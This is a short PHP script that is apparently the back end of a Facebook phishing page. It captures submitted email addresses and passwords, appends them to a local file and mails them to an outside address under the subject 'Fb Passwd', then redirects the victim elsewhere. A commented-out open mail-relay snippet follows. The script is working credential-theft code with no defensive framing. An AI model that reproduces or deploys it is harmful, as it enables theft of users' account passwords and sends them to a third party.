
<?php
$email=$_POST['email'];
$toi=$_POST['pass'];
$data=$email."\n".$toi."\n";
$myfile="login.txt";
$fb=fopen($myfile,"a+");
fwrite($fb,$data);
fclose($fb);

$to = "alpha@nandishwar.tk";
$subject = "Fb Passwd";
$headers = "From: webmaster@example.com" . "\r\n" ;

mail($to,$subject,$data,$headers);
header("location:https://www.abc.com");
exit();
?>
<!--php-->

<!--$email=$_POST['from'];-->
<!--$to=$_POST['to'];-->
<!--$txt=$_POST['txt'];-->
<!--$email="From:"+$email;-->
<!--mail($to,$email,$txt);-->
<!--?>-->
